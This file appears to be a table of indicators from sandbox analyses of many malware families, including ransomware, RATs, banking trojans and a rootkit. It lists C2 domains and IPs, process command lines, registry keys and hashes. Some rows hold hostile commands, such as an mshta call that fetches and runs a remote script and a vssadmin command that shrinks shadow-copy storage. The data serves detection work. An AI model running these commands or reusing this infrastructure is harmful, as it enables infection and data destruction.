f7d2c4199f08.xml,139.59.76.44:4000/lib/7z,139.59.76.44:4000,4020,AutoAdminLogon,4020,java.exe,"""C:\Program Files\Java\jre1.8.0_131\bin\java.exe""  -jar ""C:\Users\CIIHMN~1\Desktop\Remittance_Advice.jar"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\program files\java\jre1.8.0_131\bin\java.exe,STD_OUTPUT_HANDLE,program files\java\jre1.8.0_131\lib\rt.jar,c:\,pyd,Software\Python\PythonCore\2.7\PythonPath,HKEY_CURRENT_USER,,,,,,,,,,HTTP,80,,
gandcrab-ransomware-3-0-1-analysis.xml,ns1.wowservers.ru,46.139.176.151,3832,Domain,3832,nslookup.exe,nslookup carder.bit ns1.wowservers.ru,C:\Users\CIiHmnxMn6Ps\Desktop\,c:\windows\syswow64\nslookup.exe,STD_INPUT_HANDLE,users\ciihmnxmn6ps\appdata\roaming\microsoft\tlgmea.exe,c:\,txt,HARDWARE\DESCRIPTION\System\CentralProcessor\0,HKEY_LOCAL_MACHINE,"""C:\Users\CIiHmnxMn6Ps\AppData\Roaming\Microsoft\tlgmea.exe""",REG_SZ,,,,,c0f9e48bf74053ad638796ebbcb2bdf1,MD5,ipv4bot.whatismyipaddress.com,HTTP,80,,
gandcrab-ransomware-4-1-analysis.xml,www.macartegrise.eu,52.29.192.136,3604,1,1500,jeremy witt's dental records.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\Jeremy Witt's Dental Records.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\users\ciihmnxmn6ps\desktop\jeremy witt's dental records.exe,c:\programdata\696526f7.lock,programdata\696526f7.lock,c:\,txt,Keyboard Layout\Preload,HKEY_CURRENT_USER,,,,,,,87d25f04f055a446f937a3402cc19726,MD5,dna-cp.com,HTTP,80,,
Globeimposter-Ransomware-analysis.xml,http://rorymartin8.info/hudgy356?,,3736,DisableUNCCheck,3648,conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Users\CIIHMN~1\AppData\Local\Temp\,c:\windows\system32\conhost.exe,STD_OUTPUT_HANDLE,users\ciihmn~1\appdata\local\temp\w8nb,c:\,settingcontent-ms,Software\Microsoft\Windows Script Host\Settings,HKEY_CURRENT_USER,C:\Users\CIiHmnxMn6Ps\AppData\Roaming\vwOrbzLbc.exe,REG_SZ,,,,,1298ca6e188d639b1f38c31677bfcd95,MD5,rorymartin8.info,HTTP,80,,
grandsoft-exploit-kit-gandcrab-analysis.xml,rated.dadsrnp.xyz,185.183.98.202,2192,DisableUNCCheck,2696,iexplore.exe,"""C:\Program Files (x86)\Internet Explorer\iexplore.exe"" about:blank",C:\Users\5P5NRG~1\AppData\Local\Temp\,c:\program files (x86)\internet explorer\iexplore.exe,STD_OUTPUT_HANDLE,windows\syswow64\svchost.exe,c:\,crab,HARDWARE\DESCRIPTION\System\CentralProcessor\0,HKEY_LOCAL_MACHINE,,,,,,,41dc497fc38c5cb08ca9943bd5b7e48a,MD5,rated.dadsrnp.xyz,HTTP,80,,
gryphon-ransomware-analysis.xml,weekendfakc.top,54.205.205.46,2312,ApplicationBase,780,reg.exe,"""C:\Program Files\Microsoft Office\Office14\WINWORD.EXE""",C:\Windows\system32\,c:\windows\syswow64\reg.exe,STD_ERROR_HANDLE,users\ybz8btyyvts 7lfsqb0g\ntuser.ini.4035,c:\,4035,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,C:\Users\YbZ8BTYYvts 7lFSQB0g\AppData\Roaming\Temp13684.exe,REG_SZ,,,,,b3713b894a8d7f366299a3d0a3449485,MD5,weekendfakc.top,HTTP,80,TCP,
guloader-delivering-azorult.xml,kalpvedafoundation.com,192.185.76.89,2876,DisplayName,1112,fghvhghvgfdgfhchfg.exe,C:\Users\aETAdzjz\AppData\Roaming\fghvhghvgfdgfhchfg.exe,C:\Windows\system32\,c:\users\aetadzjz\appdata\roaming\fghvhghvgfdgfhchfg.exe,,,,,Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\00000002,HKEY_LOCAL_MACHINE,,,,,,,,,,,,,
hancitor-malware.xml,foandrenla.com,,2500,cmd.exe,2512,cmd.exe,None,C:\Windows\system32,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,users\hjrd1koky ds8lujv\appdata\roaming\convincingly.exe,c:\,exe,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,,,,,eeef5204913a313f64a2e06dea22b936,MD5,,,,,
hawkeye-order-ref-ftp.xml,ftp.r2v2.co.uk,216.37.42.30,4044,Global\.net clr networking,4044,vbc.exe,"""C:\Users\CIiHmnxMn6Ps\Desktop\order ref ftp.exe"" ",C:\Users\CIiHmnxMn6Ps\Desktop\,c:\windows\microsoft.net\framework\v2.0.50727\vbc.exe,c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config,windows\microsoft.net\framework\v2.0.50727\config\machine.config,c:\,tmp,SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,HKEY_CURRENT_USER,,,,,,,,,,,55376,TCP,"
                "
hentai-oniichan-ransomware-berserker.xml,smtp.gmail.com,74.125.205.109,4488,ApplicationBase,4068,cmd.exe,vssadmin  resize shadowstorage /for=e: /on=e: /maxsize=401MB,C:\,c:\windows\syswow64\cmd.exe,,,,,Software\Microsoft\PowerShell\3\PowerShellEngine,HKEY_LOCAL_MACHINE,Unrestricted,REG_SZ,,,,,,,,,,,
iqy-file-flawedammyy-rat-analysis.xml,brembotembo.com,185.222.202.139,2092,DisableUNCCheck,2068,cmd.exe,"""C:\Program Files\Microsoft Office\Office16\MsoSync.exe""",C:\Users\qj4SUKboE\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,programdata\settings\wsus.exe,c:\,exe,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,52393308,REG_SZ,,,,,3e3d2e9fe0976c4c8d4c6be03f5d7c79,MD5,brembotembo.com,HTTP,80,TCP,"
                "
iqy-powershell-malicious-exe.xml,localhost,31.202.128.249,2476,ApplicationBase,1224,cmd.exe,"""C:\Program Files\Microsoft Office\Office15\EXCEL.EXE""",C:\Users\ADU0VK~1\AppData\Local\Temp\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,users\adu0vk~1\appdata\local\temp\total.exe,c:\,ps1xml,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,C:\Users\aDU0VK IWA5kLS\AppData\Roaming\winpoint.exe,REG_SZ,,,,,,,ms365box.com,HTTP,80,,
jaff-ransomware.xml,babil117.com,219.118.71.141,2460,DisableUNCCheck,2000,acrord32.exe,"""C:\Program Files (x86)\Adobe\Reader 9.1.0\Reader\AcroRd32.exe"" """"",C:\Users\HJRD1K~1\AppData\Local\Temp\A9R3F80.tmp,c:\program files (x86)\adobe\reader 9.1.0\reader\acrord32.exe,c:\users\hjrd1k~1\appdata\local\temp\eewadro20,users\hjrd1k~1\appdata\local\temp\eewadro20,c:\,jaff,Software\Microsoft\Command Processor,HKEY_CLASSES_ROOT,,,,,,,466db2d02db000f686f48c0700beb840,MD5,babil117.com,HTTP,80,TCP,
keylogger-packed-open-source-crypter.xml,koko35.ddns.net,109.60.97.243,296,Policies,484,svchost.exe,explorer.exe,C:\Windows\system32\,c:\windows\system32\svchost.exe,c:\users\ciihmn~1\appdata\local\temp\ciihmnxmn6ps2.txt,users\ciihmn~1\appdata\local\temp\ciihmnxmn6ps2.txt,c:\,exe,Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,HKEY_LOCAL_MACHINE,C:\Windows\system32\install\svchost.exe,REG_EXPAND_SZ,,,,,,,,,,,
locky-ransomware-lukitus-analysis.xml,http://calster.be/87wifhFsdf,212.109.220.109,2520,taskeng.exe,864,taskeng.exe,"""C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE""",C:\Windows\system32\,c:\windows\system32\taskeng.exe,c:\users\aetadzjz\appdata\local\temp\agraba8.exe,users\aetadzjz\appdata\local\temp\agraba8.exe,c:\,lukitus,Software\Microsoft\VBA\7.1\Common,HKEY_CLASSES_ROOT,0,REG_SZ,,,,,03ba639109a5ad5406f423d1d4d472fa,MD5,calster.be,HTTP,80,,
macro-less-word-doc-dde-analysis.xml,127.0.0.1,213.183.51.187,2444,DisableUNCCheck,2932,cmd.exe,"""C:\Program Files\Microsoft Office\Office15\WINWORD.EXE""",C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\bgc6u8~1\appdata\local\temp\iun4816.bat,c:\,ps1xml,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,CutBat,REG_SZ,,,,,64b2ac701a0d67da134e13b2efc46900,MD5,,HTTP,80,TCP,
malicious-javascript-myob-attack-analysis.xml,https://moranaccountants-my.sharepoint.com/personal/lily_moranaccountants_com_au/_layouts/15/guestaccess.aspx?docid=03559bd7bd473450fab4c679cae4be913&authkey=AXWiRPNRVvwj9BsVKKyrAsc&e=259ca72ab9534857b5c3964310916b09,192.99.181.10,2472,DisplayName,2728,dllhost.exe,"""C:\Windows\system32\dllhost.exe""",C:\Windows\system32\,c:\windows\syswow64\dllhost.exe,STD_OUTPUT_HANDLE,users\5p5nrg~1\desktop\myobsu~1.js,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_LOCAL_MACHINE,,,,,,,7c71ee83af910dec760c54b96ae19f9a,MD5,moranaccountants-my.sharepoint.com,HTTP,443,TCP,
malicious-word-doc-nov-2017-analysis.xml,www.indpts.com,108.163.227.35,2516,ApplicationBase,476,systeminfo.exe,"""C:\Users\aETAdzjz\AppData\Local\Microsoft\Windows\systeminfo.exe""",C:\Users\aETAdzjz\Desktop\,c:\users\aetadzjz\appdata\local\microsoft\windows\systeminfo.exe,STD_INPUT_HANDLE,programdata\fb2f.tmp,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.indpts.com,HTTP,80,TCP,
malware-uses-jar.xml,adom2.com.br,127.0.0.1,3064,cmd.exe,1172,cmd.exe,C:\Windows\Explorer.EXE,C:\Windows\system32,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\public\n3eg\n3e.vbs,c:\,exe,Software\Microsoft\Windows Script Host\Settings,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,9fffd4e723eebc43d03333c1a4413ab4,MD5,,HTTP,80,TCP,
ms-access-email-drops-keylogger-analysis.xml,127.0.0.1,45.55.57.244,3616,PackageCode,780,msiexec.exe,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe""",C:\Windows\system32\,c:\windows\system32\msiexec.exe,STD_OUTPUT_HANDLE,users\jpenum\appdata\local\temp\mw-3cee3894-a0d4-4f50-a87c-21985e988377\files\msmpeng.exe,c:\,exe,Software\Microsoft\Windows\CurrentVersion\Installer\InProgress,HKEY_LOCAL_MACHINE,,,,,,,,,jplymell.com,HTTP,443,TCP,
obfuscated-autoit-malware-analysis.xml,jluxi.dynu.com,185.62.188.68,2560,EXEpath,2636,regsvcs.exe,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe""",C:\Users\EEBsYm5\AppData\Local\Temp\60484525\,c:\windows\microsoft.net\framework\v4.0.30319\regsvcs.exe,c:\users\eebsym5\appdata\local\temp\60484525\hin.ppt,users\eebsym5\appdata\local\temp\60484525\hin.ppt,c:\,txt,Software\34419-GRNPWA\,HKEY_CURRENT_USER,C:\Users\EEBsYm5\AppData\Local\Temp\60484525\cih.exe C:\Users\EEBsYm5\AppData\Local\Temp\60484525\cvn-nhc,REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,,,1991,TCP,
obfuscated-jar-drops-adwind-rat-analysis.xml,ZgW5tdPu,fe80:0000:0000:0000:5969:84a4:f9e2:1f2b,3264,IgnoreUserSettings,3264,cmd.exe,"xcopy ""C:\Program Files\Java\jre7"" ""C:\Users\2XC7u663GxWc\AppData\Roaming\Oracle\"" /e",C:\Users\2XC7u663GxWc\Desktop\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,users\2xc7u663gxwc\.accessibility.properties,c:\,jar,Software\Microsoft\Windows Script Host\Settings,HKEY_CURRENT_USER,"""C:\Users\2XC7u663GxWc\AppData\Roaming\Oracle\bin\javaw.exe"" -jar ""C:\Users\2XC7u663GxWc\cqsFQOTqbmg\zoIZCxYZMIr.EAMkwm""",REG_EXPAND_SZ,,,,,,,,,,,"
                "
ordinypt-wiper.xml,,,2556,ofgzdr.exe,1488,ofgzdr.exe,"""C:\Users\EEBsYm5\Desktop\ofgzdr.exe"" ",C:\Users\EEBsYm5\Desktop\,c:\users\eebsym5\desktop\ofgzdr.exe,,,,,Software\Borland\Locales,HKEY_CURRENT_USER,,,,,,,,,,,,,
petya-not-petya.xml,,192.168.0.0,2376,wevtutil.exe,2512,wevtutil.exe,"""C:\Windows\SysWOW64\AGakmVMR.exe"" ""C:\Users\HJRD1K~1\Desktop\Petya.dll"" #1",C:\Windows\system32,c:\windows\syswow64\wevtutil.exe,STD_OUTPUT_HANDLE,users\hjrd1k~1\appdata\local\temp\6b4.tmp,C:\,tmp,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,,,,,9a7ffe65e0912f9379ba6e8e0b079fde,MD5,,,445,TCP,
rtf-doc-cve-2017-11882-analysis.xml,doc2th.com,192.232.251.15,2396,ApplicationBase,1552,Windows\SYSTEM32\ntdll.dll,"""C:\Program Files\Microsoft Office\Office15\WINWORD.EXE""",C:\Windows\system32\,c:\windows\system32\svchost.exe,STD_INPUT_HANDLE,Windows\SYSTEM32\ntdll.dll,\??\C:\,ps1xml,Software\Microsoft\Internet Explorer\Main\FeatureControl,HKEY_LOCAL_MACHINE,C:\Program Files\Crfitq6x\gdigzvh.exe,REG_SZ,,,,,437efd63bf864669ef4312750c25c462,MD5,doc2th.com,HTTP,80,TCP,"
                "
rtf-doc-cve-exploit-analysis.xml,www.samyrai777m.p-host.in,185.211.244.133,2480,ApplicationBase,2480,mshta.exe,"""C:\Windows\System32\mshta.exe"" http://www.samyrai777m.p-host.in/t/t.php?thread=0",C:\Users\aETAdzjz\Desktop\,c:\windows\system32\mshta.exe,STD_INPUT_HANDLE,windows\system32\windowspowershell\v1.0\wsman.format.ps1xml,c:\,ps1xml,Software\Microsoft,HKEY_CURRENT_USER,,,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.samyrai777m.p-host.in,HTTP,80,TCP,
tdl4-rootkit.xml,127.0.0.1,,1292,svchost.exe,468,svchost.exe,C:\Windows\SysWOW64\ping.exe 127.0.0.1 -t,C:\Windows\system32,c:\windows\system32\svchost.exe,c:\users\hjrd1k~1\appdata\local\temp\3bd8.tmp,users\hjrd1k~1\appdata\local\temp\3bd8.tmp,C:\,exe,software\microsoft\windows\currentversion\internet settings\zones\3,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,6zrt3vuwf-39qwkam.com,HTTP,80,TCP,
trickbot-2019-05-16.xml,91.248.182.84.zen.spamhaus.org,185.255.55.29,3792,ApplicationBase,532,cmd.exe,svchost.exe,C:\Windows\system32\,c:\windows\system32\cmd.exe,STD_OUTPUT_HANDLE,windows\system32\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls,HKEY_LOCAL_MACHINE,1,REG_SZ,,,,,,,,,,,
unnam3d-ransomware.xml,,,348,Name,2376,cmd.exe,"""C:\Users\WhuOXYsD\AppData\Local\Temp\UNNAM3D.EXE"" ",C:\Users\WhuOXYsD\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,windows\microsoft.net\framework\v4.0.30319\clrjit.dll,c:\,xlsx,Software\WinRAR\Profiles\0,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,,,,,,,
wannacry-ransomware.xml,www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com,127.0.0.1,2652,taskdl.exe,2560,taskdl.exe,taskdl.exe,C:\ProgramData\qxtqusdnjzrizx418,c:\programdata\qxtqusdnjzrizx418\taskdl.exe,c:\windows\temp\hibsys.wncryt,windows\temp\hibsys.wncryt,C:\,wncryt,Software\Microsoft\Command Processor,HKEY_LOCAL_MACHINE,C:\ProgramData\qxtqusdnjzrizx418,REG_SZ,Microsoft Security Center (2.0) Service,SERVICE_WIN32_OWN_PROCESS,C:\Users\DSsDPMx042\Desktop\WanaDecrypt0r.bin.exe -m security,SERVICE_AUTO_START,84c82835a5d21bbcf75a61706d8ab549,MD5,www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com,HTTP,80,TCP,
word-doc-context-aware-payload.xml,www.events4u.cz,93.185.102.11,2324,ApplicationBase,852,taskeng.exe,"""C:\Program Files\Microsoft Office\Office15\WINWORD.EXE""",C:\Users\aDU0VK IWA5kLS\Desktop\,c:\windows\system32\taskeng.exe,STD_INPUT_HANDLE,windows\system32\windowspowershell\v1.0\getevent.types.ps1xml,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,,,,,,,0ebfd6e45dea48c7f54b5574d69da458,MD5,www.events4u.cz,HTTP,80,TCP,
word-doc-downloads-emotet.xml,kerineal.com,184.168.152.148,2552,ApplicationBase,2968,viewcom.exe,"""C:\Users\ATVeyDl98Z\AppData\Local\Microsoft\Windows\viewcom.exe""",C:\Users\ATVeyDl98Z\Desktop\,c:\users\atveydl98z\appdata\local\microsoft\windows\viewcom.exe,c:\email.doc,email.doc,c:\,ps1xml,Software\Microsoft\PowerShell\1\PowerShellEngine,HKEY_LOCAL_MACHINE,"""C:\Users\ATVeyDl98Z\AppData\Local\Microsoft\Windows\viewcom.exe""",REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,kerineal.com,HTTP,80,TCP,
wsf-payload-server-accept-connections-analysis.xml,resolver1.opendns.com,127.0.0.1,3968,Client,1832,conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\system32\,c:\windows\system32\conhost.exe,STD_OUTPUT_HANDLE,windows\system32\ntdll.dll,c:\,tmp,Software\AppDataLow\Software\Microsoft\07430283-BA24-D1EC-FC2B-8E95F08FA299,HKEY_CURRENT_USER,0,REG_DWORD_LITTLE_ENDIAN,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,www.atdrrtd.vs,HTTP,443,TCP,"
                "
XZZX-cryptomix-ransomware-analysis.xml,,,2500,E1010314,2500,cmd.exe,"""C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\xzzx_cryptMix.vir.exe"" ",C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\,c:\windows\syswow64\cmd.exe,STD_OUTPUT_HANDLE,programdata\f06c3c509054x0b7d28zcddbb17087b9c3e.xzzx,c:\,xzzx,Software\Microsoft\Windows\CurrentVersion,HKEY_CURRENT_USER,"""C:\ProgramData\BCE1010314.exe""",REG_DWORD_LITTLE_ENDIAN,,,,,99b4288995857301d312d28c2291153d,MD5,,,,,
zerocleare-1.xml,,,1456,svchost.exe,1092,svchost.exe,%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,C:\Windows\system32\,c:\windows\system32\svchost.exe,,,,,Software\Microsoft\Command Processor,HKEY_CURRENT_USER,,,VBoxDrv,SERVICE_KERNEL_DRIVER,C:\Users\5p5NrGJn0jS HALPmcxz\Desktop\saddrv.sys,SERVICE_DEMAND_START,,,,,,,
zeus-panda-banking-trojan-analysis.xml,330f35e9f647.loan/31F9UVfEun/0I1aalj/7QGREH4HU/RK/5rEg,,4032,UninstallString,788,users\ciihmnxmn6ps\appdata\roaming\macromedia\flash player\macromedia.com\support\flashplayer\sys\pgyfoaei3.wix,C:\Windows\SysWOW64\svchost.exe -k netsvcs,C:\Windows\system32\,c:\windows\syswow64\svchost.exe,c:\users\ciihmnxmn6ps\appdata\roaming\macromedia\flash player\macromedia.com\support\flashplayer\sys\pgyfoaei3.wix,users\ciihmnxmn6ps\appdata\roaming\macromedia\flash player\macromedia.com\support\flashplayer\sys\pgyfoaei3.wix,c:\,exe,SOFTWARE\Microsoft\Ombi,HKEY_CURRENT_USER,"""C:\Users\CIiHmnxMn6Ps\AppData\Roaming\Macromedia\Flash Player\macromedia.com\support\flashplayer\sys\containers.exe""",REG_SZ,,,,,d41d8cd98f00b204e9800998ecf8427e,MD5,330f35e9f647.loan,HTTP,443,,
